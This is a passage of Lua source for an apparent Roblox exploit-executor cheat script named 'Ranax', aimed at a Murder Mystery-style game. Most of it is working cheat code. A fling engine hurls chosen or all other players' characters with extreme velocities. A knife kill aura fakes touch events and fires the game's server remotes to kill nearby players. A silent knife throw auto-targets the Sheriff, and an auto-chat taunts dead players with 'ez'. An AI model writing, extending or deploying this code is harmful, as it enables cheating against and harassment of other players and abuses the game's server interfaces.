                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                    task.wait()
                end
            end
        until getLinVel(BasePart).Magnitude > 500 or (tick() - startT) > TimeToWait or getgenv().RanaxFlingStop
    end

    local savedFPDH = Workspace.FallenPartsDestroyHeight
    getgenv().RanaxFPDH = savedFPDH
    Workspace.FallenPartsDestroyHeight = 0 / 0

    local BV = Instance.new("BodyVelocity")
    BV.Parent = root
    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
    BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

    pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false) end)

    pcall(function()
        if troot then
            SFBasePart(troot)
        elseif thead then
            SFBasePart(thead)
        elseif handle then
            SFBasePart(handle)
        end
    end)

    Workspace.FallenPartsDestroyHeight = savedFPDH
    BV:Destroy()
    pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true) end)
    if cam then cam.CameraSubject = hum end

    if OldPos and root and root.Parent then
        local guard = tick()
        repeat
            setCharCFrame(root, OldPos * CFrame.new(0, 0.5, 0))
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
            for _, part in ipairs(char:GetChildren()) do
                if part:IsA("BasePart") then
                    setLinVel(part, Vector3.new())
                    setAngVel(part, Vector3.new())
                end
            end
            task.wait()
        until (root.Position - OldPos.Position).Magnitude < 25 or (tick() - guard) > 3
    end

    getgenv().RanaxFlingDepth = math.max(0, (getgenv().RanaxFlingDepth or 1) - 1)
end
getgenv().VFling = VFling
_G.VFling = VFling

-- Fling controllers
do local function _initFlingTab()
    local FlingActive = false
    local FlingTargets = {}

    local function countFlingTargets()
        local n = 0
        for _ in pairs(FlingTargets) do n = n + 1 end
        return n
    end

    local function collectValidFlingTargets()
        local valid = {}
        for name, plr in pairs(FlingTargets) do
            local hum = plr and plr.Parent and getHum(plr)
            if hum and hum.Health > 0 and not IsFriend(plr) and not isProtected(plr) then
                valid[#valid + 1] = plr
            else
                FlingTargets[name] = nil
            end
        end
        return valid
    end

    local function StartFlingLoop()
        if FlingActive then notify("Fling", "Already active", 2) return end
        if countFlingTargets() == 0 then notify("Fling", "No targets selected", 2) return end
        getgenv().RanaxFlingStop = false
        getgenv().RanaxFlingActive = true
        FlingActive = true
        notify("Fling", "Flinging " .. countFlingTargets() .. " target(s)", 2)
        task.spawn(function()
            while FlingActive do
                local valid = collectValidFlingTargets()
                for _, plr in ipairs(valid) do
                    if not FlingActive then break end
                    pcall(VFling, plr)
                    task.wait(0.1)
                end
                task.wait(0.5)
            end
        end)
    end

    local function StopFling()
        if not FlingActive then return end
        FlingActive = false
        getgenv().RanaxFlingActive = false
        getgenv().RanaxFlingStop = true
        task.delay(1, function() getgenv().RanaxFlingStop = false end)
        notify("Fling", "Fling stopped", 2)
    end

    local function FlingPlayerNames()
        local names = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then names[#names + 1] = p.Name end
        end
        table.sort(names, function(a, b) return a:lower() < b:lower() end)
        if #names == 0 then names = { "No players" } end
        return names
    end

    local function namesFromFlingTargets()
        local out = {}
        for n in pairs(FlingTargets) do out[#out + 1] = n end
        return out
    end

    task.wait()
local FlingTab = Window:Tab({
        Title = "Fling",
        Icon = "zap",
        Locked = false,
    })
    local FlingDrop

    local function applyFlingDropdownSelection()
        if not FlingDrop then return end
        pcall(function() FlingDrop:SetValue(namesFromFlingTargets()) end)
    end

    FlingTab:Section({
        Title = "Multi-Target Fling",
        TextSize = 15
    })

    FlingDrop = FlingTab:Dropdown({
        Title = "Targets",
        Desc = "Select one or more players to fling",
        Values = FlingPlayerNames(),
        Value = {},
        Multi = true,
        AllowNone = true,
        Callback = function(sel)
            FlingTargets = {}
            if type(sel) == "table" then
                for _, item in ipairs(sel) do
                    local name = item
                    if type(item) == "table" then
                        name = item.Value or item.Name or item.Title
                    end
                    name = tostring(name)
                    local p = Players:FindFirstChild(name)
                    if p and p ~= LocalPlayer then FlingTargets[name] = p end
                end
            elseif type(sel) == "string" then
                local p = Players:FindFirstChild(sel)
                if p and p ~= LocalPlayer then FlingTargets[sel] = p end
            end
        end
    })

    FlingTab:Button({
        Title = "Start Fling",
        Desc = "Continuously fling every selected target until stopped",
        Locked = false,
        Callback = function() StartFlingLoop() end
    })

    FlingTab:Button({
        Title = "Stop Fling",
        Desc = "Stop the fling loop",
        Locked = false,
        Callback = function() StopFling() end
    })

    FlingTab:Button({
        Title = "Fling Sheriff",
        Desc = "Locks exclusively onto the Sheriff and flings them",
        Locked = false,
        Callback = function()
            local s = getSheriff()
            if not s then notify("Fling", "No Sheriff found on map", 2) return end
            FlingTargets = {}
            FlingTargets[s.Name] = s
            applyFlingDropdownSelection()
            notify("Fling", "Targeting Sheriff: " .. s.Name, 3)
            if not FlingActive then StartFlingLoop() end
        end
    })

    FlingTab:Button({
        Title = "Fling Murderer",
        Desc = "Locks exclusively onto the Murderer and flings them",
        Locked = false,
        Callback = function()
            local m = getMurderer()
            if not m then notify("Fling", "No Murderer found on map", 2) return end
            FlingTargets = {}
            FlingTargets[m.Name] = m
            applyFlingDropdownSelection()
            notify("Fling", "Targeting Murderer: " .. m.Name, 3)
            if not FlingActive then StartFlingLoop() end
        end
    })

    FlingTab:Button({
        Title = "Select All Players",
        Desc = "Adds every other player to the fling list",
        Locked = false,
        Callback = function()
            FlingTargets = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and not IsFriend(p) and not isProtected(p) then
                    FlingTargets[p.Name] = p
                end
            end
            applyFlingDropdownSelection()
            notify("Fling", countFlingTargets() .. " target(s) selected", 2)
        end
    })

    FlingTab:Button({
        Title = "Deselect All",
        Desc = "Clears the fling list",
        Locked = false,
        Callback = function()
            FlingTargets = {}
            applyFlingDropdownSelection()
            notify("Fling", "0 target(s) selected", 2)
        end
    })

    FlingTab:Divider()

    UIElements.ProtectFriends = FlingTab:Toggle({
        Title = "Protect Friends",
        Desc = "Keeps friends out of fling / knife throw targeting",
        Icon = "users-round",
        Type = "Checkbox",
        Value = V.ProtectFriends,
        Callback = function(state)
            V.ProtectFriends = state
            notify("Fling", "Protect Friends " .. (state and "ON" or "OFF"), 2)
        end
    })

    local function refreshFlingDropdown()
        pcall(function()
            if FlingDrop and FlingDrop.Refresh then
                local names = FlingPlayerNames()
                FlingDrop:Refresh(names)
                applyFlingDropdownSelection()
            end
        end)
    end

    Players.PlayerAdded:Connect(function()
        task.wait(0.5)
        refreshFlingDropdown()
    end)

    Players.PlayerRemoving:Connect(function(plr)
        if plr then FlingTargets[plr.Name] = nil end
        task.wait(0.5)
        refreshFlingDropdown()
    end)
end _initFlingTab() end

-- =================================================================================================================
-- 6) UI  --  SETTINGS TAB ADDITIONS
-- =================================================================================================================
SettingsTab:Divider()

SettingsTab:Section({
    Title = "Ranax",
    TextSize = 15
})

UIElements.ToastToggle = SettingsTab:Toggle({
    Title = "Bottom-Right Toasts",
    Desc = "Ranax-style toast notifications in the bottom-right corner",
    Icon = "bell",
    Type = "Checkbox",
    Value = getgenv().RanaxToastEnabled,
    Callback = function(state)
        getgenv().RanaxToastEnabled = state
        notify("Settings", "Toasts " .. (state and "ON" or "OFF"), 2)
    end
})

-- ==================== INFINITE YIELD ANTI-FLING ENGINE ====================
do
    local AntiFlingSteppedConn = nil

    local function resetLocalPhysics()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            pcall(function()
                hrp.CustomPhysicalProperties = nil
            end)
        end
    end

    local function startAntiFlingEngine()
        if AntiFlingSteppedConn then
            AntiFlingSteppedConn:Disconnect()
            AntiFlingSteppedConn = nil
        end
        resetLocalPhysics()

        AntiFlingSteppedConn = RunService.Stepped:Connect(function()
            if not V.AntiFling then return end
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    for _, part in ipairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end
        end)
    end

    local function stopAntiFlingEngine()
        if AntiFlingSteppedConn then
            AntiFlingSteppedConn:Disconnect()
            AntiFlingSteppedConn = nil
        end
        resetLocalPhysics()
    end

    getgenv().StartRanaxAntiFling = startAntiFlingEngine
    getgenv().StopRanaxAntiFling = stopAntiFlingEngine

    if V.AntiFling then
        startAntiFlingEngine()
    end

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.2)
        resetLocalPhysics()
        if V.AntiFling then
            startAntiFlingEngine()
        end
    end)

    UIElements.AntiFling = SettingsTab:Toggle({
        Title = "Anti-Fling",
        Desc = "Official Infinite Yield Anti-Fling: zero slow-fall, turns off player collision",
        Icon = "shield",
        Type = "Checkbox",
        Value = V.AntiFling,
        Callback = function(state)
            V.AntiFling = state
            if state then
                startAntiFlingEngine()
                notify("Protection", "Anti-Fling: ACTIVE (Infinite Yield)", 2.5, "shield")
            else
                stopAntiFlingEngine()
                notify("Protection", "Anti-Fling: OFF", 2)
            end
        end
    })
end

-- ==================== FPS BOOSTER / ULTRA PERFORMANCE ====================
_G.FpsBoosterActive = false
_G.originalLightingProps = {}

local function applyFpsBooster(state)
    local Lighting = game:GetService("Lighting")
    local Terrain = Workspace:FindFirstChildOfClass("Terrain")

    if state then
        pcall(function()
            _G.originalLightingProps.GlobalShadows = Lighting.GlobalShadows
            _G.originalLightingProps.FogEnd = Lighting.FogEnd
            _G.originalLightingProps.Brightness = Lighting.Brightness
        end)

        pcall(function()
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9e9
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        end)

        if Terrain then
            pcall(function()
                Terrain.WaterWaveSize = 0
                Terrain.WaterWaveSpeed = 0
                Terrain.WaterReflectance = 0
                Terrain.WaterTransparency = 0
            end)
        end

        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                if not (obj.Parent and (obj.Parent:IsA("Tool") or obj.Parent:IsA("Accessory"))) then
                    obj.Transparency = 1
                end
            end
        end

        notify("FPS Booster", "Ultra FPS Boost: ACTIVE ", 3, "zap")
    else
        pcall(function()
            if _G.originalLightingProps.GlobalShadows ~= nil then
                Lighting.GlobalShadows = _G.originalLightingProps.GlobalShadows
                Lighting.FogEnd = _G.originalLightingProps.FogEnd
                Lighting.Brightness = _G.originalLightingProps.Brightness
            end
        end)
        notify("FPS Booster", "FPS Boost: OFF", 2)
    end
end

UIElements.FpsBoosterToggle = SettingsTab:Toggle({
    Title = "FPS Booster",
    Desc = "Disables shadows, map particles & decals to maximize FPS and stop stutters",
    Icon = "gauge",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        _G.FpsBoosterActive = state
        applyFpsBooster(state)
    end
})

UIElements.NotifyToggle = SettingsTab:Toggle({
    Title = "Notifications",
    Desc = "Master switch for all Ranax notifications / toasts",
    Icon = "bell",
    Type = "Checkbox",
    Value = getgenv().RanaxNotifyEnabled ~= false,
    Callback = function(state)
        getgenv().RanaxNotifyEnabled = state
        notify("Settings", "Notifications " .. (state and "ON" or "OFF"), 2)
    end
})

UIElements.SheriffDeathNotify = SettingsTab:Toggle({
    Title = "Sheriff Death Notification",
    Desc = "Notifies you when the Sheriff dies",
    Icon = "skull",
    Type = "Checkbox",
    Value = V.SheriffDeathNotify,
    Callback = function(state)
        V.SheriffDeathNotify = state
        notify("Settings", "Sheriff Death Notify " .. (state and "ON" or "OFF"), 2)
    end
})

-- [Freeze Emote feature removed]

-- =================================================================================================================
-- 7) UI  --  MURDERER TAB ADDITIONS (KNIFE TOOLS)
-- =================================================================================================================



MurdererTab:Section({
    Title = "Knife Tools",
    TextSize = 15
})

UIElements.SilentKnifeThrow = MurdererTab:Toggle({
    Title = "Silent Knife Throw",
    Desc = "Automatically throws the knife at the priority target",
    Icon = "skull",
    Type = "Checkbox",
    Value = V.SilentKnifeThrow,
    Callback = function(state)
        V.SilentKnifeThrow = state
        notify("Knife", "Silent Throw " .. (state and "ON" or "OFF"), 2)
    end
})

UIElements.KnifeWallCheck = MurdererTab:Toggle({
    Title = "Knife Wall Check",
    Desc = "Only throws knife if target is visible and not behind a wall",
    Icon = "wall",
    Type = "Checkbox",
    Value = V.KnifeWallCheck ~= false,
    Callback = function(state)
        V.KnifeWallCheck = state
        notify("Knife", "Wall Check " .. (state and "ON" or "OFF"), 2)
    end
})

MurdererTab:Button({
    Title = "Throw Knife",
    Desc = "Lead-aim knife throw at the priority target",
    Locked = false,
    Callback = function()
        local target = chooseKnifeTarget()
        if not target then notify("Knife", "No valid target", 2) return end
        local ok, name = throwKnifeAtTarget(target)
        if ok then
            notify("Knife", "Threw at " .. tostring(name), 2)
        else
            notify("Knife", "Failed: " .. tostring(name), 2)
        end
    end
})

UIElements.KnifeThrowPriority = MurdererTab:Dropdown({
    Title = "Knife Priority",
    Desc = "Which target to throw at first",
    Values = { "Sheriff First", "Murderer First", "Closest" },
    Value = V.KnifeThrowPriority,
    Multi = false,
    AllowNone = false,
    Callback = function(option)
        V.KnifeThrowPriority = option
        notify("Knife", "Priority: " .. tostring(option), 2)
    end
})

UIElements.ThrowKnifeKeybind = MurdererTab:Keybind({
    Title = "Throw Knife Keybind",
    Desc = "Press to throw the knife at the priority target (Press Delete for None)",
    Value = KeybindValues.ThrowKnifeKeybind or "None",
    Callback = function(v)
        KeybindValues.ThrowKnifeKeybind = tostring(v):gsub("Enum.KeyCode.", "")
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            pcall(function() if UIElements.ThrowKnifeKeybind and UIElements.ThrowKnifeKeybind.SetValue then UIElements.ThrowKnifeKeybind:SetValue("None") end end)
            return
        end
        local target = chooseKnifeTarget()
        if not target then notify("Knife", "No valid target", 2) return end
        local ok, name = throwKnifeAtTarget(target)
        if ok then
            notify("Knife", "Threw at " .. tostring(name), 2)
        else
            notify("Knife", "Failed: " .. tostring(name), 2)
        end
    end
})

MurdererTab:Divider()

_G.KnifeKillAuraEnabled = false
_G.KnifeKillAuraDistance = 14

local function toggleKnifeKillAura(forcedState)
    local newState
    if forcedState ~= nil then
        newState = forcedState
    else
        newState = not (_G.KnifeKillAuraEnabled or false)
    end
    _G.KnifeKillAuraEnabled = newState
    notify("Knife", "Kill Aura " .. (newState and "ON" or "OFF"), 2, "sword")
    if UIElements.KnifeKillAuraToggle then
        pcall(function()
            if typeof(UIElements.KnifeKillAuraToggle.Set) == "function" then
                UIElements.KnifeKillAuraToggle:Set(newState)
            elseif typeof(UIElements.KnifeKillAuraToggle.SetValue) == "function" then
                UIElements.KnifeKillAuraToggle:SetValue(newState)
            end
        end)
    end
end

local _lastKillAuraPress = 0
local function handleKillAuraPress()
    if tick() - _lastKillAuraPress < 0.2 then return end
    _lastKillAuraPress = tick()
    toggleKnifeKillAura()
end

UIElements.KnifeKillAuraToggle = MurdererTab:Toggle({
    Title = "Knife Kill Aura",
    Desc = "Automatically slashes any nearby player within range without throwing knife",
    Icon = "sword",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state ~= _G.KnifeKillAuraEnabled then
            toggleKnifeKillAura(state)
        end
    end
})

UIElements.KnifeKillAuraDistance = MurdererTab:Slider({
    Title = "Kill Aura Range",
    Desc = "Distance in studs to trigger knife slash",
    Step = 1,
    Value = {
        Min = 6,
        Max = 25,
        Default = 14,
    },
    Callback = function(val)
        _G.KnifeKillAuraDistance = val
    end
})

local KnifeKillAuraKeybind
KnifeKillAuraKeybind = MurdererTab:Keybind({
    Title = "Knife Kill Aura Keybind",
    Desc = "Toggle Knife Kill Aura ON / OFF (Press Delete for None)",
    Value = KeybindValues.KnifeKillAuraKeybind or "None",
    Callback = function(v)
        KeybindValues.KnifeKillAuraKeybind = tostring(v):gsub("Enum.KeyCode.", "")
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            pcall(function()
                if KnifeKillAuraKeybind and KnifeKillAuraKeybind.Set then
                    KnifeKillAuraKeybind:Set("None")
                end
            end)
            return
        end
        handleKillAuraPress()
    end
})
UIElements.KnifeKillAuraKeybind = KnifeKillAuraKeybind

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if UserInputService:GetFocusedTextBox() then return end
    local bind = KeybindValues.KnifeKillAuraKeybind
    if bind and bind ~= "None" and bind ~= "" then
        if input.KeyCode and input.KeyCode.Name == bind then
            handleKillAuraPress()
        end
    end
end)

-- =================================================================================================================
-- 8) BACKGROUND LOOPS
-- =================================================================================================================
-- Knife Kill Aura Loop (Close proximity slash - High Performance / Zero FPS Drop)
task.spawn(function()
    local lastAttackTick = 0
    local cachedKnife = nil
    local cachedHandle = nil
    local cachedEvents = nil

    local function getAuraKnife(char)
        if cachedKnife and cachedKnife.Parent == char then
            return cachedKnife
        end
        cachedKnife = nil
        cachedHandle = nil
        cachedEvents = nil

        local held = char:FindFirstChildOfClass("Tool")
        if held and isKnifeTool(held) then
            cachedKnife = held
            cachedHandle = held:FindFirstChild("Handle") or held:FindFirstChildWhichIsA("BasePart")
            cachedEvents = held:FindFirstChild("Events")
            return held
        end

        local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bp then
            for _, t in ipairs(bp:GetChildren()) do
                if t:IsA("Tool") and isKnifeTool(t) then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum then pcall(function() hum:EquipTool(t) end) end
                    cachedKnife = t
                    cachedHandle = t:FindFirstChild("Handle") or t:FindFirstChildWhichIsA("BasePart")
                    cachedEvents = t:FindFirstChild("Events")
                    return t
                end
            end
        end
        return nil
    end

    while true do
        if _G.KnifeKillAuraEnabled then
            task.wait(0.06)
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hrp and hum and hum.Health > 0 then
                local knife = getAuraKnife(char)
                if knife then
                    local now = tick()
                    if now - lastAttackTick >= 0.18 then
                        local myPos = hrp.Position
                        local range = _G.KnifeKillAuraDistance or 14
                        local rangeSq = range * range

                        for _, plr in ipairs(Players:GetPlayers()) do
                            if plr ~= LocalPlayer and not IsFriend(plr) then
                                local tchar = plr.Character
                                if tchar then
                                    local thum = tchar:FindFirstChildOfClass("Humanoid")
                                    local troot = tchar:FindFirstChild("HumanoidRootPart") or tchar:FindFirstChild("Torso")
                                    if thum and troot and thum.Health > 0 then
                                        local diff = troot.Position - myPos
                                        local distSq = diff.X * diff.X + diff.Y * diff.Y + diff.Z * diff.Z
                                        if distSq <= rangeSq then
                                            lastAttackTick = now
                                            pcall(function()
                                                knife:Activate()
                                                local handle = cachedHandle or knife:FindFirstChild("Handle") or knife:FindFirstChildWhichIsA("BasePart")
                                                if handle and typeof(firetouchinterest) == "function" then
                                                    firetouchinterest(troot, handle, 0)
                                                    firetouchinterest(troot, handle, 1)
                                                end
                                                local events = cachedEvents or knife:FindFirstChild("Events")
                                                if events then
                                                    local stab = events:FindFirstChild("KnifeStabbed")
                                                    local touched = events:FindFirstChild("HandleTouched")
                                                    if stab then stab:FireServer("Slash") end
                                                    if touched then touched:FireServer(troot) end
                                                else
                                                    local stab = knife:FindFirstChild("KnifeStabbed") or knife:FindFirstChild("Slash") or knife:FindFirstChild("Stab")
                                                    local touched = knife:FindFirstChild("HandleTouched")
                                                    if stab and stab:IsA("RemoteEvent") then stab:FireServer("Slash") end
                                                    if touched and touched:IsA("RemoteEvent") then touched:FireServer(troot) end
                                                end
                                            end)
                                            break
                                        end
                                    end
                                end
                            end
                        end
                    end
                else
                    task.wait(0.2)
                end
            else
                task.wait(0.25)
            end
        else
            task.wait(0.4)
        end
    end
end)

-- Silent knife throw loop
task.spawn(function()
    while true do
        if V.SilentKnifeThrow and getRoleOfPlayer(LocalPlayer) == "MURDERER" then
            local target = chooseKnifeTarget()
            if target then
                pcall(function() throwKnifeAtTarget(target) end)
            end
            task.wait(V.KnifeThrowDelay or 0.4)
        else
            task.wait(1)
        end
    end
end)

-- Sheriff death notification
local trackedSheriff = nil
task.spawn(function()
    while task.wait(1) do
        if V.SheriffDeathNotify then
            local s = getSheriff()
            if s then
                trackedSheriff = s
            elseif trackedSheriff then
                local hum = trackedSheriff.Character and trackedSheriff.Character:FindFirstChildOfClass("Humanoid")
                if hum and hum.Health <= 0 then
                    notify("Sheriff", "Sheriff died: " .. trackedSheriff.Name, 3, "skull")
                end
                trackedSheriff = nil
            end
        end
    end
end)

-- ==================== AUTO CHAT ON MURDERER DEATH ENGINE ====================
do
    local trackedMurdPlr = nil
    local murdDiedConn = nil
    local lastDeathChatTick = 0

    local function triggerMurdDeathChat(murdPlr)
        if not _G.AutoChatMurdDeath then return end
        if not murdPlr or murdPlr == LocalPlayer then return end
        local now = tick()
        if now - lastDeathChatTick < 6 then return end
        lastDeathChatTick = now

        task.delay(0.45, function()
            local msg = _G.AutoChatMurdDeathMsg or "ez"
            if msg and msg ~= "" then
                sendRobloxChatMessage(msg)
            end
        end)
    end

    local function hookMurderer(plr)
        if not plr or plr == LocalPlayer then return end
        if murdDiedConn then
            pcall(function() murdDiedConn:Disconnect() end)
            murdDiedConn = nil
        end
        local char = plr.Character
        local hum = char and (char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 2))
        if hum then
            murdDiedConn = hum.Died:Connect(function()
                triggerMurdDeathChat(plr)
            end)
        end
    end

    task.spawn(function()
        while true do
            task.wait(0.3)
            if _G.AutoChatMurdDeath then
                local currentMurd = nil
                pcall(function()
                    if typeof(getMurdererLive) == "function" then
                        currentMurd = getMurdererLive()
                    elseif typeof(getMurderer) == "function" then
                        currentMurd = getMurderer()
                    end
                end)

                if currentMurd and currentMurd ~= LocalPlayer then
                    if currentMurd ~= trackedMurdPlr then
                        trackedMurdPlr = currentMurd
                        hookMurderer(currentMurd)
                    else
                        local char = currentMurd.Character
                        local hum = char and char:FindFirstChildOfClass("Humanoid")
                        if hum and hum.Health <= 0 then
                            triggerMurdDeathChat(currentMurd)
                        end
                    end
                elseif trackedMurdPlr then
                    local char = trackedMurdPlr.Character
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    if not char or not hum or hum.Health <= 0 then
                        triggerMurdDeathChat(trackedMurdPlr)
                    end
                    trackedMurdPlr = nil
                end
            else
                trackedMurdPlr = nil
                task.wait(0.8)
            end
        end
    end)
end

-- Ready toast
task.delay(1, function()
    notify("Ranax", "Loaded", 4)
end)

-- Auto-load default config if exists
task.delay(1.5, function()
    pcall(function()
        local ok = LoadConfig("default")
        if ok then
            notify("Config", "Auto-loaded default config", 2.5, "check")
        end
    end)
end)
